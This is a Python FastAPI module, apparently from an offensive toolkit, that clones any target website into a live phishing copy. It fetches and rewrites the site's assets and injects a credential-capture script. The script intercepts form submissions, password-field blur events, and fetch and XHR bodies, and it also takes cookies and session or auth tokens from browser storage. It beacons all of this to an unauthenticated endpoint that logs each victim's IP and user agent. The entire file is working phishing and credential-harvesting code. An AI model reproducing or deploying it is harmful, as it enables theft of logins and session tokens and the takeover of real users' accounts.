"""Phishing site cloner — one-click clone, credential capture, live serve."""

import hashlib
import json
import mimetypes
import re
import shutil
from pathlib import Path
from urllib.parse import urljoin, urlparse
from uuid import uuid4

from bs4 import BeautifulSoup
from fastapi import APIRouter, Depends, HTTPException, Request
from fastapi.responses import FileResponse, HTMLResponse, JSONResponse, Response
from pydantic import BaseModel

from core.auth import verify_api_key
from core.config import OPEN_CORS_HEADERS, now
from core.replay import get_http_client, get_replay_headers
from core.sse import broadcast
from core import state

PHISH_CACHE_ROOT = Path(__file__).parent.parent / "phish_cache"

router = APIRouter(tags=["phish"])

# ─── Request Models ──────────────────────────────────────────────────


class PhishCloneRequest(BaseModel):
    url: str
    useAuthContext: bool = True
    customJs: str | None = None


# ─── Capture Script Builder ──────────────────────────────────────────


def _build_capture_script(site_id: str) -> str:
    # Fixed template JS — zero LLM involvement. SITE_ID is the only variable.
    return (
        "(function(){"
        f"var B='/p/{site_id}/capture';"
        "var _sent={};"
        "var _formSubmit=HTMLFormElement.prototype.submit;"
        "function _b(obj){try{var k=JSON.stringify(obj);if(_sent[k])return;_sent[k]=1;"
        "navigator.sendBeacon(B,new Blob([k],{type:'application/json'}))}catch(_){}}"

        # ── Credential field names to watch ──
        "var _cnames=/^(user|email|login|pass|passwd|password|credential|phone|"
        "account|usr|uname|username|secret)$/i;"
        "var _atypes=['text','email','password','tel'];"

        # ── Harvest nearby credential fields around a trigger element ──
        "function _harvest(anchor){"
        "var form=anchor.closest('form'),scope=form||document;"
        "var inputs=scope.querySelectorAll('input');"
        "var fields={};"
        "for(var i=0;i<inputs.length;i++){"
        "var inp=inputs[i],n=inp.name||inp.id||inp.autocomplete||'';"
        "var t=inp.type||'text';"
        "if(_atypes.indexOf(t)>=0||_cnames.test(n)){"
        "if(inp.value)fields[n||'input_'+i]=inp.value;"
        "}}"
        "return fields;}"

        # ── Post-interaction snapshot: cookies + storage tokens ──
        "function _snapshot(){"
        "setTimeout(function(){"
        "var s={t:'snapshot',ts:Date.now()};"
        "if(document.cookie)s.cookies=document.cookie;"
        "var keys=['token','session','auth','jwt','access','refresh','id_token','csrf'];"
        "var ls={},ss={};"
        "try{for(var i=0;i<localStorage.length;i++){"
        "var k=localStorage.key(i);"
        "for(var j=0;j<keys.length;j++){if(k.toLowerCase().indexOf(keys[j])>=0){"
        "ls[k]=localStorage.getItem(k).substring(0,500);break}}"
        "}}catch(_){}"
        "try{for(var i=0;i<sessionStorage.length;i++){"
        "var k=sessionStorage.key(i);"
        "for(var j=0;j<keys.length;j++){if(k.toLowerCase().indexOf(keys[j])>=0){"
        "ss[k]=sessionStorage.getItem(k).substring(0,500);break}}"
        "}}catch(_){}"
        "if(Object.keys(ls).length)s.localStorage=ls;"
        "if(Object.keys(ss).length)s.sessionStorage=ss;"
        "_b(s);"
        "},600);}"

        # ── Hook 1: Form submission ──
        "document.addEventListener('submit',function(e){"
        "e.preventDefault();"
        "var f=e.target,d=Object.fromEntries(new FormData(f));"
        "_b({t:'form',action:f.action,fields:d,ts:Date.now()});"
        "_snapshot();"
        "setTimeout(function(){_formSubmit.call(f)},350);"
        "},true);"

        # ── Hook 2: Password blur — capture without waiting for submit ──
        "function _attachBlur(inp){"
        "if(inp._r3d)return;inp._r3d=1;"
        "inp.addEventListener('blur',function(){"
        "if(!inp.value)return;"
        "var fields=_harvest(inp);"
        "if(Object.keys(fields).length){"
        "_b({t:'blur',fields:fields,ts:Date.now()});"
        "_snapshot();}"
        "});"
        "}"

        # ── Hook 3: MutationObserver for dynamically added forms/inputs ──
        "function _scan(root){"
        "var pw=root.querySelectorAll('input[type=password]');"
        "for(var i=0;i<pw.length;i++)_attachBlur(pw[i]);"
        "var inputs=root.querySelectorAll('input');"
        "for(var i=0;i<inputs.length;i++){"
        "var n=inputs[i].name||inputs[i].id||inputs[i].autocomplete||'';"
        "if(_cnames.test(n))_attachBlur(inputs[i]);"
        "}}"
        "_scan(document);"
        "new MutationObserver(function(muts){"
        "for(var i=0;i<muts.length;i++){"
        "var added=muts[i].addedNodes;"
        "for(var j=0;j<added.length;j++){"
        "if(added[j].querySelectorAll)_scan(added[j]);"
        "}}"
        "}).observe(document.body||document.documentElement,"
        "{childList:true,subtree:true});"

        # ── Hook 4: Fetch body intercept ──
        "var _f=window.fetch;"
        "window.fetch=function(){"
        "var a=arguments,u=a[0],o=a[1];"
        "if(o&&o.body){"
        "try{_b({t:'fetch',url:String(u),body:String(o.body).substring(0,2000),ts:Date.now()});"
        "_snapshot();}catch(_){}"
        "}"
        "return _f.apply(this,a);"
        "};"

        # ── Hook 5: XHR body intercept ──
        "var _xhr=XMLHttpRequest.prototype.send;"
        "XMLHttpRequest.prototype.send=function(body){"
        "if(body){"
        "try{_b({t:'xhr',body:String(body).substring(0,2000),ts:Date.now()});"
        "_snapshot();}catch(_){}"
        "}"
        "return _xhr.apply(this,arguments);"
        "};"
        "})();"
    )


# ─── Asset Crawler ───────────────────────────────────────────────────


def _resolve_url(asset_url: str, base_origin: str, page_url: str) -> str | None:
    """Resolve a possibly-relative asset URL to an absolute URL."""
    if not asset_url or asset_url.startswith("data:") or asset_url.startswith("blob:"):
        return None
    if asset_url.startswith("//"):
        asset_url = "https:" + asset_url
    if asset_url.startswith("http://") or asset_url.startswith("https://"):
        return asset_url
    return urljoin(page_url, asset_url)


def _asset_filename(url: str) -> str:
    """Derive a safe local filename from a URL, preserving extension."""
    parsed = urlparse(url)
    path = parsed.path.rstrip("/")
    ext = Path(path).suffix if path else ""
    if not ext or len(ext) > 10:
        ext = ""
    digest = hashlib.sha1(url.encode()).hexdigest()[:12]
    return f"{digest}{ext}"


_CSS_URL_RE = re.compile(r'url\(\s*["\']?([^"\')\s]+)["\']?\s*\)')


async def _fetch_and_cache_asset(
    client, url: str, headers: dict, assets_dir: Path, asset_map: dict
) -> str | None:
    """Fetch a single asset and write it to disk. Returns the local filename."""
    if url in asset_map:
        return asset_map[url]
    try:
        resp = await client.get(url, headers=headers)
        if resp.status_code >= 400:
            return None
        fname = _asset_filename(url)
        (assets_dir / fname).write_bytes(resp.content)
        asset_map[url] = fname
        return fname
    except Exception:
        return None


async def _rewrite_css_urls(
    css_text: str, page_url: str, origin: str, client, headers: dict,
    assets_dir: Path, asset_map: dict,
) -> str:
    """Rewrite url() references inside CSS to point to local cached assets."""
    urls_found = _CSS_URL_RE.findall(css_text)
    for raw_url in urls_found:
        absolute = _resolve_url(raw_url, origin, page_url)
        if not absolute:
            continue
        local = await _fetch_and_cache_asset(client, absolute, headers, assets_dir, asset_map)
        if local:
            css_text = css_text.replace(raw_url, f"assets/{local}")
    return css_text


async def _clone_page(
    url: str, origin: str, headers: dict, site_id: str,
    cache_dir: Path, assets_dir: Path, custom_js: str | None = None,
) -> dict:
    """Fetch, parse, rewrite, inject, and cache a phish clone."""
    async with get_http_client(timeout=20, follow_redirects=True) as client:
        resp = await client.get(url, headers=headers)
        if resp.status_code >= 400:
            raise HTTPException(
                status_code=502,
                detail=f"Target returned HTTP {resp.status_code}",
            )

        soup = BeautifulSoup(resp.text, "html.parser")
        asset_map: dict[str, str] = {}

        tag_attrs = [
            ("link", "href"),
            ("script", "src"),
            ("img", "src"),
            ("source", "srcset"),
            ("video", "src"),
            ("audio", "src"),
        ]
        for tag_name, attr in tag_attrs:
            for el in soup.find_all(tag_name):
                raw = el.get(attr)
                if not raw:
                    continue
                absolute = _resolve_url(raw, origin, url)
                if not absolute:
                    continue
                local = await _fetch_and_cache_asset(
                    client, absolute, headers, assets_dir, asset_map,
                )
                if local:
                    el[attr] = f"assets/{local}"

        for style_tag in soup.find_all("style"):
            if style_tag.string:
                style_tag.string = await _rewrite_css_urls(
                    style_tag.string, url, origin, client, headers,
                    assets_dir, asset_map,
                )

        for el in soup.find_all(style=True):
            inline = el["style"]
            if "url(" in inline:
                el["style"] = await _rewrite_css_urls(
                    inline, url, origin, client, headers, assets_dir, asset_map,
                )

        forms_detected = len(soup.find_all("form"))

        if soup.body is None:
            soup.append(BeautifulSoup("<body></body>", "html.parser").body)
        script_tag = soup.new_tag("script")
        script_tag.string = _build_capture_script(site_id)
        soup.body.append(script_tag)

        if custom_js:
            custom_tag = soup.new_tag("script")
            custom_tag.string = custom_js
            soup.body.append(custom_tag)

        (cache_dir / "index.html").write_text(str(soup), encoding="utf-8")

    return {
        "assetsCloned": len(asset_map),
        "formsDetected": forms_detected,
    }


# ─── Management Endpoints (API-key protected) ────────────────────────


@router.post("/r3d/attack/phish/clone", dependencies=[Depends(verify_api_key)])
async def phish_clone(body: PhishCloneRequest):
    """Clone a target URL into a serveable phish site with credential capture."""
    site_id = uuid4().hex[:8]
    cache_dir = PHISH_CACHE_ROOT / site_id
    assets_dir = cache_dir / "assets"
    assets_dir.mkdir(parents=True, exist_ok=True)

    parsed = urlparse(body.url)
    origin = f"{parsed.scheme}://{parsed.netloc}"
    headers = get_replay_headers(origin, {}) if body.useAuthContext else {}

    try:
        info = await _clone_page(
            body.url, origin, headers, site_id,
            cache_dir, assets_dir, body.customJs,
        )
    except HTTPException:
        shutil.rmtree(cache_dir, ignore_errors=True)
        raise
    except Exception as exc:
        shutil.rmtree(cache_dir, ignore_errors=True)
        return JSONResponse(
            status_code=502,
            content={"ok": False, "error": str(exc)},
            headers=OPEN_CORS_HEADERS,
        )

    state.phish_sites[site_id] = {
        "siteId": site_id,
        "targetUrl": body.url,
        "targetOrigin": origin,
        "clonedAt": now().isoformat(),
        "assetsCloned": info["assetsCloned"],
        "formsDetected": info["formsDetected"],
        "captured": [],
    }

    serve_url = f"/p/{site_id}/"

    broadcast("phish_cloned", {
        "siteId": site_id,
        "targetUrl": body.url,
        "serveUrl": serve_url,
        "assetsCloned": info["assetsCloned"],
        "formsDetected": info["formsDetected"],
    })

    return JSONResponse(
        content={
            "ok": True,
            "siteId": site_id,
            "serveUrl": serve_url,
            "assetsCloned": info["assetsCloned"],
            "formsDetected": info["formsDetected"],
        },
        headers=OPEN_CORS_HEADERS,
    )


@router.get("/r3d/attack/phish/sites", dependencies=[Depends(verify_api_key)])
async def phish_list():
    """List all active phish sites."""
    sites = []
    for sid, meta in state.phish_sites.items():
        sites.append({
            **{k: v for k, v in meta.items() if k != "captured"},
            "captureCount": len(meta.get("captured", [])),
        })
    return JSONResponse(content={"ok": True, "sites": sites}, headers=OPEN_CORS_HEADERS)


@router.get("/r3d/attack/phish/{site_id}", dependencies=[Depends(verify_api_key)])
async def phish_detail(site_id: str):
    """Get phish site details including captured credentials."""
    meta = state.phish_sites.get(site_id)
    if not meta:
        raise HTTPException(status_code=404, detail="Phish site not found")
    return JSONResponse(content={"ok": True, **meta}, headers=OPEN_CORS_HEADERS)


@router.delete("/r3d/attack/phish/{site_id}", dependencies=[Depends(verify_api_key)])
async def phish_delete(site_id: str):
    """Remove a phish site and its cached files."""
    state.phish_sites.pop(site_id, None)
    cache_dir = PHISH_CACHE_ROOT / site_id
    shutil.rmtree(cache_dir, ignore_errors=True)
    return JSONResponse(content={"ok": True, "deleted": site_id}, headers=OPEN_CORS_HEADERS)


# ─── Victim-Facing Endpoints (NO auth) ──────────────────────────────


@router.post("/p/{site_id}/capture")
async def phish_capture(site_id: str, request: Request):
    """Beacon endpoint — receives captured credentials from injected JS."""
    meta = state.phish_sites.get(site_id)
    if not meta:
        return Response(status_code=204)

    try:
        raw = await request.body()
        data = json.loads(raw) if raw else {}
    except Exception:
        data = {}

    entry = {
        "ts": now().isoformat(),
        "ip": request.client.host if request.client else "unknown",
        "userAgent": request.headers.get("user-agent", ""),
        "data": data,
    }
    meta.setdefault("captured", []).append(entry)

    field_count = len(data.get("fields", {})) if data.get("t") == "form" else 0

    broadcast("phish_credential_captured", {
        "siteId": site_id,
        "targetUrl": meta.get("targetUrl", ""),
        "fieldCount": field_count,
        "captureType": data.get("t", "unknown"),
        "ts": entry["ts"],
    })

    return Response(status_code=204)


@router.get("/p/{site_id}/{path:path}")
async def phish_serve(site_id: str, path: str):
    """Serve cloned phish site files to victims."""
    if site_id not in state.phish_sites:
        raise HTTPException(status_code=404)

    cache_dir = PHISH_CACHE_ROOT / site_id

    if not path or path == "/":
        index = cache_dir / "index.html"
        if index.is_file():
            return HTMLResponse(
                index.read_text(encoding="utf-8"),
                headers={"Cache-Control": "no-store"},
            )
        raise HTTPException(status_code=404)

    safe_path = Path(path)
    if ".." in safe_path.parts:
        raise HTTPException(status_code=400)

    target = cache_dir / safe_path
    if not target.is_file():
        raise HTTPException(status_code=404)

    content_type = mimetypes.guess_type(str(target))[0] or "application/octet-stream"
    return FileResponse(target, media_type=content_type)
